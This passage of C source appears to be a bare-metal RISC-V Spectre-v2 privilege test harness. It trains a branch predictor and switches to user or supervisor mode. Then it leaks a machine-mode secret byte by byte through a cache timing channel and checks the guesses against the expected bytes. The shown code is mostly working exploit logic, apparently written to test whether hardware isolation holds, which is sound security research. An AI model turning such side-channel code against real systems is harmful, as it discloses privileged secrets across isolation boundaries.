    tries_used[len] = tries + 1;
#if EARLY_STOP
    if (enough_confidence(hits))
      break;
#endif
  }

#if !V2_ASM_ROUND || V2_ASM_CONTROL_ROUND || V2_PROBE_CONTROL_ROUND
  for (uint64_t i = 0; i < CHANNEL_ENTRIES; ++i)
    hits[i] = hits[i] > control_hits[i] ? hits[i] - control_hits[i] : 0;
#else
  (void)control_hits;
  (void)control_value;
#endif

  top_two_idx(hits, CHANNEL_ENTRIES, leaked_idx[len], leaked_score[len]);
  top_four_idx(hits, CHANNEL_ENTRIES, leaked_top_idx[len], leaked_top_score[len]);
  for (uint64_t i = 0; i < CHANNEL_ENTRIES; ++i)
    leaked_hits[len][i] = hits[i];
}

static U_TEXT int attacker_run(void)
{
#if PAGE_TABLE_ATTACKER
  probe_direct_secret_access();
#endif

  for (uint64_t i = 0; i < SECRET_SZ; ++i)
    read_byte(&secret[SECRET_OFFSET + i], i);

  return 0;
}

static U_TEXT __attribute__((noreturn, unused)) void attacker_entry(void)
{
  svc_exit((uint64_t)attacker_run());
  for (;;)
    asm volatile("wfi");
}

asm(
    ".section .u_text,\"ax\",@progbits\n"
    ".balign 4096\n"
    ".globl __u_text_end\n"
    "__u_text_end:\n"
    ".previous\n");

#if USE_AM_CTE
static _Context *service_ecall_handler(_Event *ev, _Context *ctx) __attribute__((unused));
static _Context *service_ecall_handler(_Event *ev, _Context *ctx)
{
  (void)ev;
  trap_count++;
  last_mcause = ctx->scause;
  last_mepc = ctx->sepc;
  ctx->sepc += 4;

  uint64_t svc = ctx->GPR1;
  uint64_t a0 = ctx->GPR2;
  uint64_t a1 = ctx->GPR3;

  if (svc == SVC_TRAIN) {
    train_call_count++;
    train_service();
  } else if (svc == SVC_ATTACK) {
    attack_call_count++;
    attack_service((char *)a0);
  } else if (svc == SVC_FLUSH_CHANNEL) {
    flush_call_count++;
    flush_channel_service((uint8_t *)a0);
  } else if (svc == SVC_V2_ROUND_ASM) {
    asm_round_call_count++;
    v2_round_asm_service((char *)a0, (uint8_t *)a1);
  } else if (svc == SVC_EXIT) {
    exit_call_count++;
    attack_status = (int)a0;
    attack_done = 1;
  } else {
    bad_trap_count++;
    attack_status = 3;
    attack_done = 1;
  }

  return ctx;
}
#endif

static void enter_user_attacker(void)
{
  uintptr_t user_sp = (uintptr_t)u_stack + sizeof(u_stack) - 16;
  uintptr_t mstatus;

  init_pmp();
  asm volatile("csrw mtvec, %0" :: "r"((uintptr_t)m_trap_entry) : "memory");
  asm volatile("csrw medeleg, zero\ncsrw mideleg, zero" ::: "memory");
  asm volatile("li t0, -1\ncsrw mcounteren, t0\ncsrw scounteren, t0" ::: "t0", "memory");
  install_priv_page_table();
  asm volatile("mv %0, sp" : "=r"(saved_m_sp));

  asm volatile("csrr %0, mstatus" : "=r"(mstatus));
  mstatus = (mstatus & ~MSTATUS_MPP_MASK) | ((uint64_t)ATTACKER_MPP << 11);
  asm volatile("csrw mstatus, %0" :: "r"(mstatus) : "memory");

  asm volatile(
      "mv sp, %0\n"
      "csrw mepc, %1\n"
      "mret\n"
      ".globl machine_low_return\n"
      "machine_low_return:\n"
      "csrw satp, zero\n"
      "sfence.vma zero, zero\n"
      "fence.i\n"
      "la t0, saved_m_sp\n"
      "ld sp, 0(t0)\n"
      :
      : "r"(user_sp), "r"((uintptr_t)attacker_entry)
      : "t0", "memory");
}

int main(void)
{
  for (uint64_t i = 0; i < CHANNEL_ENTRIES; ++i)
    channel[i * CHANNEL_STRIDE] = 1;
  init_v2_target_chain();

  uint64_t measured_threshold = xs_calibrate_threshold(channel, CHANNEL_STRIDE);
  active_threshold = measured_threshold;
#if USE_FIXED_CACHE_HIT_THRESHOLD
  active_threshold = CACHE_HIT_THRESHOLD;
#else
  if (active_threshold == 0)
    active_threshold = CACHE_HIT_THRESHOLD;
#endif

  printf("[v2-privilege] model=%s attacker=%s victim=M isolation=%s secret=PTE_U0 pmp=permissive-not-boundary satp=%s service=%s round=%s fixed_marker=%d secret_offset=%d secret_sz=%d candidates=%d tries=%d train=%d warmup=%d extra_flush=%d asm_control=%d probe_control=%d probe_mix=%d early_strict=%d asm_style=%d\n",
         PAGE_TABLE_ATTACKER ? "sv48-pte-u-isolation" : "interface",
         ATTACKER_MPP == 0 ? "U" : "S",
         PAGE_TABLE_ATTACKER ? "Sv48-PTE-U0" : "none",
         PAGE_TABLE_ATTACKER ? "sv48" : "off",
         DIRECT_SERVICE_CALL ? "direct-dispatch" : (USE_AM_CTE ? "am-cte-ecall" : "machine-ecall"),
         V2_ASM_ROUND ? "asm-single-site" : "multi-ecall-c",
         V2_FIXED_MARKER, SECRET_OFFSET, SECRET_SZ, PROBE_CANDIDATES,
         V2_ATTACK_TRIES, V2_TRAINING_LOOPS, V2_BYTE_WARMUP_ROUNDS,
         V2_EXTRA_CHANNEL_FLUSHES, V2_ASM_CONTROL_ROUND,
         V2_PROBE_CONTROL_ROUND, V2_PROBE_MIX, V2_EARLY_STOP_STRICT,
         V2_ASM_STYLE);
  printf("[v2-privilege] calibration fallback=%d measured=%lu threshold=%lu fixed=%d\n",
         CACHE_HIT_THRESHOLD, measured_threshold, active_threshold,
         USE_FIXED_CACHE_HIT_THRESHOLD);
  printf("[v2-privilege] control service_return=no-secret direct_secret_access=%s\n",
         PAGE_TABLE_ATTACKER ? "expect-fault" : "not-tested");
  printf("[v2-privilege] secret=%p channel=%p gadget=%p safe_target=%p\n",
         secret, channel, gadget, safe_target);

#if DIRECT_SERVICE_CALL
  attack_status = attacker_run();
  attack_done = 1;
#elif USE_AM_CTE
  _cte_init(NULL);
  irq_handler_reg(SCAUSE_SUPERVISOR_ECALL, service_ecall_handler);
  attack_status = attacker_run();
  attack_done = 1;
#else
  enter_user_attacker();
#endif

  printf("[v2-privilege] isolation U-direct-secret-read fault_seen=%lu completed=%lu value=0x%02lx expected=%s u_text=[%p,%p) m_secret=%p\n",
         direct_secret_fault_seen, direct_secret_read_completed,
         direct_secret_read_value & 0xfful,
         PAGE_TABLE_ATTACKER ? "fault" : "not-tested",
         __u_text_start, __u_text_end, secret);
  printf("[v2-privilege] traps=%lu train_calls=%lu attack_calls=%lu asm_round_calls=%lu flush_calls=%lu exit_calls=%lu bad_traps=%lu last_mcause=%lu last_mepc=%p status=%d\n",
         trap_count, train_call_count, attack_call_count, asm_round_call_count,
         flush_call_count, exit_call_count, bad_trap_count, last_mcause,
         (void *)last_mepc, attack_status);

  int leak_ok = 1;
  for (uint64_t i = 0; i < SECRET_SZ; ++i) {
    uint8_t guess = leaked_idx[i][0];
    uint8_t second = leaked_idx[i][1];
    uint8_t expected = (uint8_t)secret[SECRET_OFFSET + i];
    printf("[v2-privilege] byte %lu: expected=%c(0x%02x) expected_score=%lu guess=%c(0x%02x) score=%lu second=%c(0x%02x) score=%lu\n",
           i,
           expected, expected, leaked_hits[i][expected],
           (guess >= 32 && guess < 127) ? guess : '?', guess, leaked_score[i][0],
           (second >= 32 && second < 127) ? second : '?', second, leaked_score[i][1]);
    printf("[v2-privilege] byte %lu tries=%lu early_stop=%d min_score=%d gap=%d\n",
           i, tries_used[i], EARLY_STOP, EARLY_STOP_MIN_SCORE, EARLY_STOP_GAP);
    printf("[v2-privilege] byte %lu top4=%c(0x%02x):%lu,%c(0x%02x):%lu,%c(0x%02x):%lu,%c(0x%02x):%lu\n",
           i,
           (leaked_top_idx[i][0] >= 32 && leaked_top_idx[i][0] < 127) ? leaked_top_idx[i][0] : '?',
           leaked_top_idx[i][0], leaked_top_score[i][0],
           (leaked_top_idx[i][1] >= 32 && leaked_top_idx[i][1] < 127) ? leaked_top_idx[i][1] : '?',
           leaked_top_idx[i][1], leaked_top_score[i][1],
           (leaked_top_idx[i][2] >= 32 && leaked_top_idx[i][2] < 127) ? leaked_top_idx[i][2] : '?',
           leaked_top_idx[i][2], leaked_top_score[i][2],
           (leaked_top_idx[i][3] >= 32 && leaked_top_idx[i][3] < 127) ? leaked_top_idx[i][3] : '?',
           leaked_top_idx[i][3], leaked_top_score[i][3]);
    if (guess != expected && second != expected)
      leak_ok = 0;
  }

  int isolation_ok = !PAGE_TABLE_ATTACKER ||
                     (direct_secret_fault_seen != 0 &&
                      direct_secret_read_completed == 0);
  int pass = attack_status == 0 && bad_trap_count == 0 && isolation_ok && leak_ok;
  printf("[v2-privilege] check=%s\n", pass ? "PASS" : "FAIL");
  return pass ? 0 : 1;
}
